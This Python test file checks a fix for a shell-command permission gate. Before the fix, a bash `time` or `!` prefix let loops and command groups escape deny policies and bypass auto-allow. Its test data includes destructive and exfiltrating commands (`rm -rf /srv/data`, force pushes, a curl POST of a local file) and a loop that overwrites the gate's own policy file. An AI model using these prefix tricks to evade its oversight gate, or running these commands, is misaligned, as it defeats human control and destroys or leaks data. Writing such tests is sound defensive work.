"""Issue #853: a compound command behind bash's pipeline prefixes `time`, `time -p`, `time --` and `!` is read as it
is without them.

bash reads `time [-p] [--]` and `!` before a pipeline as prefixes of it, so `time for i in 1 2; do cp /tmp/evil
gates.yaml; cd ~/.exo/policies; done` runs the loop as it runs without `time`: its second pass writes the gate's
own policy file (#479). The gate read `time` as a program that takes options, so the compound behind it was that
program's argv: an opaque_exec ask that `deny: [store_write]` did not deny, which the hook's bypass auto-allowed,
and a `{ rm -rf /srv/data; }` behind it was not a delete. classify now also reads such a line with the prefixes left
out and the compound opened, beside main's reading (decide keeps the strictest, as for #546's reading as before).
Every command string here is data for exo.gate.classify/decide and the exo-gate hook; none is run.
"""
import asyncio
import sys
import time
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "plugins" / "exo-gate"))  # the root suite has no plugin path

from exo import crypto, gate, principal  # noqa: E402
from exo.ledger import Ledger  # noqa: E402
from exo_gate import hook  # noqa: E402


@pytest.fixture(autouse=True)
def _home(tmp_path, monkeypatch):
    home = tmp_path / "home"
    (home / ".exo" / "policies").mkdir(parents=True)
    (home / ".exo" / "state").mkdir(parents=True)
    monkeypatch.setenv("HOME", str(home))
    for name in ("EXO_HOME", "EXO_KEYS_FILE", "CLAUDE_CONFIG_DIR", "EXO_PRINCIPAL_STORE", "EXO_SEAT"):
        monkeypatch.delenv(name, raising=False)
    return home


def _bash(cmd):
    return gate.classify({"tool": "bash", "args": {"command": cmd}})


def _pol(**gates):
    return gate.normalize_policies({"gates": gates})


def _rule(**match):
    return _pol(rules=[{"match": match, "decision": "deny", "reason": "no"}])


CATS = ["store_write", "delete", "force_push", "web_post"]
POLICIES = {
    "default": _pol(),
    "deny": _pol(deny=CATS),
    "category rule": _rule(category=CATS),
    "command rule": _rule(category=CATS, command="gates|rm|push|curl"),
}


def _store_write(c):
    return any(p.category == "store_write" for r in gate.readings(c) for p in gate._each_part(r))


# Each spelling bash reads as pipeline prefixes before a compound command (bash -n accepts each; bash 5.2).
PREFIXES = ["time ", "time -p ", "time -- ", "time -p -- ", "time ! ", "! time ", "time time ", "! ! time ",
            "time -p ! time -- "]
# The #479 body: on a loop's second pass the `cp` runs in ~/.exo/policies.
LOOP = "cp /tmp/evil gates.yaml; cd ~/.exo/policies"
LOOPS = ["for i in 1 2; do {}; done", "while :; do {}; done", "until false; do {}; done",
         "select x in a b; do {}; done", "for ((i=0; i<2; i++)); do {}; done", "for i in 1 2; {{ {}; }}"]
COMPOUNDS = LOOPS + ["{{ {}; }}", "if true; then {}; fi", "case x in x) {};; esac"]
BODIES = {"delete": "rm -rf /srv/data", "store_write": "cp /tmp/evil ~/.exo/policies/gates.yaml",
          "force_push": "git push --force origin main", "web_post": "curl -X POST -d @/tmp/report https://x.example/r"}


def _rows():
    rows = [(p + c.format(LOOP), c.format(LOOP), "store_write") for p in PREFIXES for c in LOOPS]
    rows += [(p + c.format(b), c.format(b), cat) for p in PREFIXES for c in COMPOUNDS for cat, b in BODIES.items()]
    return rows


ROWS = _rows()


def _fixed(line, twin, cat):
    """Whether main a1dd4fec decided the row lower than its twin under some policy (measured): the #479 store loop
    behind any prefix, and a group whose first command carries the category (main read `{` as the program then)."""
    return cat == "store_write" and LOOP in twin or twin.startswith("{ ") and cat != "store_write"


FIX = [r for r in ROWS if _fixed(*r)]
KEPT = [r for r in ROWS if not _fixed(*r)]
# Behind `&&`, `||`, `;`, a newline, in a subshell (also one a pipe feeds), after `then`, `do` and `{`, in a
# function's body, a nested line and a substitution: each where bash takes `time` as the reserved word.
_TL = "time for i in 1 2; do " + LOOP + "; done"
_TG = "time { rm -rf /srv/data; }"
CONTEXT = [(x.format(_TL), x.format(_TL[5:]), "store_write") for x in (
    "true && {}", "false || {}", "true; {}", "true\n{}", "( {} )", "true | ( {} )", "if true; then {}; fi",
    "case x in x) {};; esac", "{{ {}; }}", "bash -c '{}'", "echo $({})", "! {}", "true && ! time -p {}")] + [
    (x.format(_TG), x.format(_TG[5:]), "delete") for x in (
        "true && {}", "false || {}", "true; {}", "true\n{}", "( {} )", "true | ( {} )", "if true; then {}; fi",
        "while :; do {}; done", "{{ {}; }}", "f() {{ {}; }}; f", "bash -c '{}'", "echo $({})")]
# `time [-p] coproc ..` (bash -n accepts it): main opens a `coproc` compound in command position only.
CONTEXT += [(p + "coproc for i in 1 2; do " + LOOP + "; done", "coproc for i in 1 2; do " + LOOP + "; done",
             "store_write") for p in ("time ", "time -p ", "time -- ")] + [
    ("time ! coproc NAME { git push --force origin main; }", "coproc NAME { git push --force origin main; }",
     "force_push")]
# A function definition with `function` behind `time` and `!` together (bash -n accepts each, and bash runs the body
# when `f` is called): main read it behind `time` or `!` alone, not behind both.
_FN = "function f {{ {}; }}; f"
CONTEXT += [(p + _FN.format(b), _FN.format(b), cat) for p in ("time ! ", "time -p ! ", "time -- ! ", "! time ! ",
                                                              "time time ! ") for cat, b in BODIES.items()
            if cat != "store_write"] + [
    (x.format("time ! " + _FN.format(BODIES["delete"])), x.format(_FN.format(BODIES["delete"])), "delete")
    for x in ("true && {}", "bash -c '{}'")]
# ..and behind one of them alone, or with the #479 loop as the body (its store scan found it), main read it already.
KEPT += [(p + _FN.format(b), _FN.format(b), cat) for p in ("time ", "time -p ", "! ") for cat, b in BODIES.items()
         if cat != "store_write"] + [
    ("time ! " + _FN.format(LOOPS[0].format(LOOP)), _FN.format(LOOPS[0].format(LOOP)), "store_write")]
FIX += CONTEXT


def _check(line, twin, cat):
    c, t = _bash(line), _bash(twin)
    for name, pol in POLICIES.items():
        got, want = gate.decide(c, pol).outcome, gate.decide(t, pol).outcome
        assert gate.OUTCOMES.index(got) >= gate.OUTCOMES.index(want), (line, name, got, want)
    assert any(p.category == cat for r in gate.readings(c) for p in gate._each_part(r)), line
    assert gate.no_grant(c) == gate.no_grant(t), line


@pytest.mark.parametrize("line,twin,cat", FIX)
def test_a_compound_behind_a_pipeline_prefix_decides_as_without_it(line, twin, cat):
    # Fails on main a1dd4fec: there the line asks as opaque_exec, and the deny list, category rule or command rule
    # that denies its twin does not deny it.
    _check(line, twin, cat)
    assert gate.decide(_bash(line), POLICIES["deny"]).outcome == "deny", line


@pytest.mark.parametrize("line,twin,cat", KEPT)
def test_a_compound_main_already_read_through_the_prefix_keeps_its_decision(line, twin, cat):
    # The rest of the matrix: main a1dd4fec read these bodies as commands of their own after the header (a `do` or
    # `then` body, a `{ ..; }` loop body) or found the store path in them, so they already decide as their twin.
    _check(line, twin, cat)


@pytest.mark.parametrize("prefix", PREFIXES)
def test_the_479_loop_behind_a_prefix_is_a_store_write_no_grant_covers(prefix):
    line = prefix + LOOPS[0].format(LOOP)
    c = _bash(line)
    assert _store_write(c) and gate.no_grant(c) and gate.binds_exact(c), line
    # main's reading stays, as main made it, and still leads on the tie with the store write
    assert c.category == "opaque_exec" and "opaque_exec" in [r.category for r in gate.readings(c)], line
    assert gate.decide(c).outcome == "ask" and gate.decide(c, _pol(deny=["store_write"])).outcome == "deny"
    r = gate.decide(c, _pol(reserved=["store_write"]))
    assert r.outcome == "ask" and r.reserved and r.reserved[0][0] == "store_write", r
    lifted = _pol(categories={"store_write": "allow", "opaque_exec": "allow", "read": "allow", "shell": "allow"})
    assert gate.decide(c, lifted).outcome == "ask", line             # no policy lowers the store floor
    approvals = gate.normalize_approvals({"approvers": {"default": ["principal", "seat:lead"]}})
    assert gate.call_approvers(c, approvals) == ["principal"], line


# Guards with #857 (main 75d72a7f): a while/until condition whose first command is the cd into the store is a store
# write behind a prefix too, as on main (its substitution is read there with the prefix left on); the opened reading
# keeps it
COND_LOOPS = ["while cd ~/.exo/policies$(cp /tmp/evil gates.yaml); do sleep 1; done",
              "until ! cd ~/.exo/policies$(cp /tmp/evil gates.yaml); do sleep 1; done",
              "while pushd ~/.exo/policies`cp /tmp/evil gates.yaml`; do sleep 1; done"]


@pytest.mark.parametrize("prefix", ["time ", "time -p ", "! ", "time ! "])
@pytest.mark.parametrize("loop", COND_LOOPS)
def test_a_condition_cd_loop_behind_a_prefix_stays_a_store_write(prefix, loop):
    c = _bash(prefix + loop)
    assert _store_write(c) and gate.no_grant(c), prefix + loop
    assert gate.decide(c, _pol(deny=["store_write"])).outcome == "deny", prefix + loop


# Guards: these decide as on main a1dd4fec (category, outcome and rule under each policy), and those with no compound
# behind a prefix bash reads get no second reading. `time` before a simple command or a subshell was read already;
# GNU time's options (`-o`, `-f`) are a program's, not the reserved word's; a quoted `time` is a program; and the
# rest are bash syntax errors, so nothing runs: a simple command before a compound (`nohup for`, `command for`,
# `env X=1 while`), `time -p -p` and `time -- -p`, and `time` after `|` or `|&`, where bash does not take it as the
# reserved word (also after a newline that follows `|`).
GUARDS = [
    ("time ls", "read", "allow", "allow"),
    ("time ls -la /tmp", "read", "allow", "allow"),
    ("time rm -rf /srv/data", "delete", "ask", "deny"),
    ("time ( rm -rf /srv/data )", "delete", "ask", "deny"),
    ("time (cp /tmp/evil gates.yaml; cd ~/.exo/policies)", "read", "allow", "allow"),
    ("time -p ( git push --force origin main )", "force_push", "ask", "deny"),
    ("time -o f ls", "read", "allow", "allow"),
    ("time -f %e ls", "read", "allow", "allow"),
    ("time -o f for i in 1 2; do " + LOOP + "; done", "opaque_exec", "ask", "ask"),
    ("'time' for i in 1 2; do " + LOOP + "; done", "opaque_exec", "ask", "ask"),
    ("\\time for i in 1 2; do " + LOOP + "; done", "opaque_exec", "ask", "ask"),
    ("\"time\" { rm -rf /srv/data; }", "opaque_exec", "ask", "ask"),
    ("nohup for i in 1 2; do " + LOOP + "; done", "opaque_exec", "ask", "ask"),
    ("command for i in 1 2; do " + LOOP + "; done", "opaque_exec", "ask", "ask"),
    ("env X=1 while :; do " + LOOP + "; done", "opaque_exec", "ask", "ask"),
    ("time -p -p for i in 1 2; do " + LOOP + "; done", "opaque_exec", "ask", "ask"),
    ("time -- -p for i in 1 2; do " + LOOP + "; done", "opaque_exec", "ask", "ask"),
    ("time -p -- -- for i in 1 2; do " + LOOP + "; done", "opaque_exec", "ask", "ask"),
    # razi-exo's rows on #853: a simple command or an assignment before a compound is a bash syntax error too
    ("sudo -n while read l; do cp x gates.yaml; cd ~/.exo/policies; done < /tmp/l", "opaque_exec", "ask", "ask"),
    ("X=1 time for i in 1 2; do " + LOOP + "; done", "opaque_exec", "ask", "ask"),
    ("> f time for i in 1 2; do " + LOOP + "; done", "opaque_exec", "ask", "ask"),
    ("time > f for i in 1 2; do " + LOOP + "; done", "opaque_exec", "ask", "ask"),
    ("!time for i in 1 2; do " + LOOP + "; done", "opaque_exec", "ask", "ask"),     # one word, not `!`
    ("true | ! time { rm -rf /srv/data; }", "opaque_exec", "ask", "ask"),          # `!` after `|`
    ("true | time for i in 1 2; do " + LOOP + "; done", "opaque_exec", "ask", "ask"),
    ("true |& time { rm -rf /srv/data; }", "opaque_exec", "ask", "ask"),
    ("true |\ntime { rm -rf /srv/data; }", "opaque_exec", "ask", "ask"),
    ("echo { time { rm -rf /srv/data; }", "read", "allow", "allow"),    # words echo prints: `time` is no command
    # bash reads `time` here as the coprocess's NAME, and main opened the loop after it already
    ("coproc time for i in 1 2; do " + LOOP + "; done", "opaque_exec", "ask", "deny"),
    ("time", "read", "allow", "allow"),
    ("time -p", "read", "allow", "allow"),
]
# Lines with a compound behind a prefix whose second reading adds nothing stricter: they decide as on main too.
SAME = [
    ("time { ls; }", "opaque_exec", "ask", "ask"),
    ("time for i in 1 2; do ls; done", "opaque_exec", "ask", "ask"),
    ("time if true; then ls; fi", "opaque_exec", "ask", "ask"),
    ("time { cp /tmp/evil gates.yaml; cd ~/.exo/policies; }", "opaque_exec", "ask", "ask"),
    ("! for i in 1 2; do " + LOOP + "; done", "store_write", "ask", "deny"),       # main opened it already
]
GUARD_POLICIES = {"default": _pol(), "deny": _pol(deny=CATS), "category rule": _rule(category=CATS),
                  "command rule": _rule(category=CATS, command="gates|rm|push|curl"),
                  "allow time": _pol(rules=[{"match": {"command": "^time "}, "decision": "allow", "reason": "ok"}])}
# What each of GUARDS + SAME decides on main a1dd4fec under GUARD_POLICIES, (outcome, rule) in that order (measured).
_ALLOW = [("allow", "matrix")] * 4 + [("allow", "rule")]
_OPAQUE = [("ask", "opaque")] * 5
_DENIED = [("ask", "matrix"), ("deny", "deny"), ("deny", "rule"), ("deny", "rule")]
MAIN = {
    "time ls": _ALLOW,
    "time ls -la /tmp": _ALLOW,
    "time rm -rf /srv/data": _DENIED + [("allow", "rule")],
    "time ( rm -rf /srv/data )": _DENIED + [("ask", "matrix")],
    "time (cp /tmp/evil gates.yaml; cd ~/.exo/policies)": _ALLOW,
    "time -p ( git push --force origin main )": _DENIED + [("ask", "matrix")],
    "time -o f ls": _ALLOW,
    "time -f %e ls": _ALLOW,
    "time -o f for i in 1 2; do " + LOOP + "; done": _OPAQUE,
    "'time' for i in 1 2; do " + LOOP + "; done": _OPAQUE,
    "\\time for i in 1 2; do " + LOOP + "; done": _OPAQUE,
    "\"time\" { rm -rf /srv/data; }": _OPAQUE,
    "nohup for i in 1 2; do " + LOOP + "; done": _OPAQUE,
    "command for i in 1 2; do " + LOOP + "; done": _OPAQUE,
    "env X=1 while :; do " + LOOP + "; done": _OPAQUE,
    "time -p -p for i in 1 2; do " + LOOP + "; done": _OPAQUE,
    "time -- -p for i in 1 2; do " + LOOP + "; done": _OPAQUE,
    "time -p -- -- for i in 1 2; do " + LOOP + "; done": _OPAQUE,
    "sudo -n while read l; do cp x gates.yaml; cd ~/.exo/policies; done < /tmp/l": _OPAQUE,
    "X=1 time for i in 1 2; do " + LOOP + "; done": _OPAQUE,
    "> f time for i in 1 2; do " + LOOP + "; done": _OPAQUE,
    "time > f for i in 1 2; do " + LOOP + "; done": _OPAQUE,
    "!time for i in 1 2; do " + LOOP + "; done": _OPAQUE,
    "true | ! time { rm -rf /srv/data; }": _OPAQUE,
    "true | time for i in 1 2; do " + LOOP + "; done": _OPAQUE,
    "true |& time { rm -rf /srv/data; }": _OPAQUE,
    "true |\ntime { rm -rf /srv/data; }": _OPAQUE,
    "echo { time { rm -rf /srv/data; }": [("allow", "matrix")] * 5,
    "coproc time for i in 1 2; do " + LOOP + "; done": [("ask", "opaque"), ("deny", "deny"), ("deny", "rule"),
                                                        ("deny", "rule"), ("ask", "opaque")],
    "time": [("allow", "matrix")] * 5,
    "time -p": _ALLOW,
    "time { ls; }": _OPAQUE,
    "time for i in 1 2; do ls; done": _OPAQUE,
    "time if true; then ls; fi": _OPAQUE,
    "time { cp /tmp/evil gates.yaml; cd ~/.exo/policies; }": _OPAQUE,
    "! for i in 1 2; do " + LOOP + "; done": [("ask", "floor"), ("deny", "deny"), ("deny", "rule"), ("deny", "rule"),
                                              ("ask", "floor")],
}


@pytest.mark.parametrize("line,category,outcome,denied", GUARDS + SAME)
def test_guard_rows_decide_as_on_main(line, category, outcome, denied):
    c = _bash(line)
    assert (c.category, gate.decide(c).outcome, gate.decide(c, POLICIES["deny"]).outcome) == \
        (category, outcome, denied), (line, c.category)
    got = [(gate.decide(c, p).outcome, gate.decide(c, p).rule) for p in GUARD_POLICIES.values()]
    assert got == MAIN[line], (line, got)
    if (line, category, outcome, denied) in GUARDS:
        assert c.also is None or line.startswith("coproc"), line


# Once a known limit, not of the prefix: main a1dd4fec did not open a `coproc` compound right after `!`, `then` or
# `{`, so the reading without the prefix found no loop behind `! time coproc` either (both rows asked as opaque_exec,
# and `deny: [store_write]` did not deny them). #864 opens such a compound in a reading of its own, and the reading
# without the prefix opens it too (`! time coproc for ..` is read there as `! coproc for ..`), so these are the #479
# store loop, as their twin without the prefix is. Main's opaque_exec reading still leads on the tie.
_CO = "coproc for i in 1 2; do " + LOOP + "; done"
_CO_W = "coproc W { for i in 1 2; do " + LOOP + "; done; }"


@pytest.mark.parametrize("line,twin", [
    ("! time " + _CO, "! " + _CO),
    ("if true; then time " + _CO + "; fi", "if true; then " + _CO + "; fi"),
    ("time ! " + _CO, "! " + _CO),
    ("! time ! " + _CO, "! ! " + _CO),
    ("{ time " + _CO_W + "; }", "{ " + _CO_W + "; }"),
    ("time -p ! " + _CO_W, "! " + _CO_W),
])
def test_a_coproc_after_bang_or_then_behind_a_prefix_is_read_opened(line, twin):
    c = _bash(line)
    got = [(gate.decide(c, p).outcome, gate.decide(c, p).rule) for p in GUARD_POLICIES.values()]
    assert (c.category, got) == ("opaque_exec", _OPAQUE[:1] + [("deny", "deny"), ("deny", "rule"), ("deny", "rule"),
                                                               ("ask", "opaque")]), (line, c.category, got)
    assert _store_write(c) and gate.no_grant(c), line
    assert "opaque_exec" in [r.category for r in gate.readings(c)], line        # main's reading stays
    approvals = gate.normalize_approvals({"approvers": {"default": ["principal", "seat:lead"]}})
    assert gate.call_approvers(c, approvals) == ["principal"], line
    _check(line, twin, "store_write")


# The hook: the store loop behind a prefix asks the principal, as its twin does, and permissions bypass keeps the
# store floor; under `deny: [store_write]` the hook blocks it. On main a1dd4fec bypass auto-allowed it.
class MockCtx:
    def __init__(self, settings):
        self.settings = settings
        self.hooks = {}

    def get_config(self, key, default=None):
        return self.settings.get(key, default)

    def register_hook(self, name, cb):
        self.hooks.setdefault(name, []).append(cb)


def _gate(tmp_path, bypass, gates=None):
    root = tmp_path / "store"
    (root / "policies").mkdir(parents=True)
    (root / "policies" / "approvals.yaml").write_text('approvers:\n  default: [principal, "seat:builder"]\n')
    if gates is not None:
        (root / "policies" / "gates.yaml").write_text(gates)
    key = tmp_path / "gate.key"
    crypto.save_key(crypto.keygen(), key)
    ctx = MockCtx({"principal_store": str(root), "key_path": str(key), "decision_model": False, "mode": "enforce"})
    g = hook.register(ctx)
    g.policies()
    if bypass:
        token = principal.CALLER.set(principal.Caller("principal:tui"))
        try:
            hook.permissions_command(g, "bypass")
        finally:
            principal.CALLER.reset(token)
        assert g.bypass_on
    return g, ctx, root


def _run(ctx, line):
    [cb] = ctx.hooks["pre_tool_call"]
    return asyncio.run(cb(tool_name="terminal", args={"command": line}, session_id="s1", tool_call_id="c1",
                          turn_id="t1", task_id="", author="principal:tui"))


HOOK_ROWS = [p + c.format(LOOP) for p, c in zip(["time ", "time -p ", "! time ", "time -p -- ", "time ! ", "time "],
                                                  LOOPS)] + ["true && " + _TL, "( " + _TL + " )"]


@pytest.mark.parametrize("bypass", [False, True])
@pytest.mark.parametrize("line", HOOK_ROWS)
def test_the_hook_asks_the_principal_and_bypass_keeps_the_floor(tmp_path, bypass, line):
    twin = line.replace("time -p -- ", "").replace("time -p ", "").replace("! time ", "").replace(
        "time ! ", "").replace("time ", "")
    c, t = _bash(line), _bash(twin)
    assert gate.binds_exact(c) == gate.binds_exact(t) is True, line
    assert gate.call_approvers(c, None) == gate.call_approvers(t, None) == ["principal"], line
    g, ctx, root = _gate(tmp_path, bypass)
    r = _run(ctx, line)
    assert r is not None and r["action"] == "approve" and r["approvers"] == ["principal"], (line, r)
    assert r.get("once") is True and r.get("binding"), r
    if bypass:
        with Ledger(root / "ledger.sqlite") as led:
            [row] = [e["body"] for e in led.iter(kind="action") if e["body"].get("phase") == "decision"]
        assert row["outcome"] == "ask" and row["bypass"] == {"floor": "store_write"}, row
        assert g.permissions.auto_approved == 0 and g.permissions.floor_asks == 1


@pytest.mark.parametrize("bypass", [False, True])
@pytest.mark.parametrize("line", HOOK_ROWS[:2] + ["time { rm -rf /srv/data; }"])
def test_the_hook_blocks_under_a_deny_list(tmp_path, bypass, line):
    _, ctx, _ = _gate(tmp_path, bypass, gates="deny: [store_write, delete]\n")
    r = _run(ctx, line)
    assert r is not None and r["action"] == "block", (line, r)


def test_the_hook_still_lets_bypass_allow_a_plain_compound_behind_time(tmp_path):
    # `time { ls; }` asks as opaque_exec on main and here; bypass auto-allows it on both (no store write, no secret).
    g, ctx, root = _gate(tmp_path, True)
    assert _run(ctx, "time { ls; }") is None
    assert g.permissions.auto_approved == 1 and g.permissions.floor_asks == 0


# Cost: the second reading reads the line once more, as without its prefixes, with budgets of its own. So a line
# costs about main's reading of it plus its twin's (the line without the prefixes, which #479's second pass of a
# loop makes the dearer one). A line that writes the home's config.json also reads each reading's D-074 ordinary
# reading once (CONFIG). CPU time of this process, the better of three runs: `whole` is the line, `first` the line
# with the second reading patched out (main's reading), `twin` the twin. Measured on this tree (best of five):
# whole / (first + twin) is 1.06 for LONG, 1.11 for DEEP, 1.04 for NEST, 1.25 for LOOPED and 0.98 for CONFIG, and
# whole / main a1dd4fec's time 1.7, 1.0, 1.8, 3.5 and 4.9 (CONFIG: 0.284 s here against 0.058 s on main and 0.234 s
# for its twin; LOOPED: 0.074 s here against 0.021 s on main and 0.042 s for its twin).
LONG = "; ".join(["time { :; }"] * 300)
DEEP = "time ! " * 150 + "{ " + LOOP + "; }"
NEST = "time { " * 40 + LOOP + "; }" * 40
LOOPED = "; ".join(["time for i in 1 2; do " + LOOP + "; done"] * 20)
CONFIG = "; ".join(["time for i in 1 2; do " + LOOP + "; done; echo x > ~/.exo/config.json"] * 20)


@pytest.mark.parametrize("line", [LONG, DEEP, NEST, LOOPED, CONFIG])
def test_the_second_reading_costs_about_what_the_twin_does(monkeypatch, line):
    def cpu(text):
        best = None
        for _ in range(3):
            t = time.process_time()
            gate.classify({"tool": "bash", "args": {"command": text}})
            took = time.process_time() - t
            best = took if best is None else min(best, took)
        return best
    whole, twin = cpu(line), cpu(line.replace("time ", ""))
    monkeypatch.setattr(gate, "_opened_reading", lambda c, *a: c, raising=False)    # main has no such reading
    first = cpu(line)
    assert whole <= 2 * (first + twin) + 0.05, (whole, first, twin)
